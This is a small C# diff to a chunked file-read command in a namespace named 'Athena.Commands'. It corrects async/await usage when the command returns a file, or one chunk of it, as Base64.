@@ -84,7 +84,7 @@ namespace Athena.Commands
                 if (job.total_chunks == 1)
                 {
                     job.complete = true;
-                    return await Misc.Base64Encode(File.ReadAllBytes(job.path));
+                    return Misc.Base64Encode(await File.ReadAllBytesAsync(job.path));
                 }
                 byte[] buffer = new byte[job.chunk_size];
 
@@ -103,7 +103,7 @@ namespace Athena.Commands
                     fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                     job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
 
-                    return await Misc.Base64Encode(buffer);
+                    return Misc.Base64Encode(buffer);
                 }
             }
             catch (Exception e)
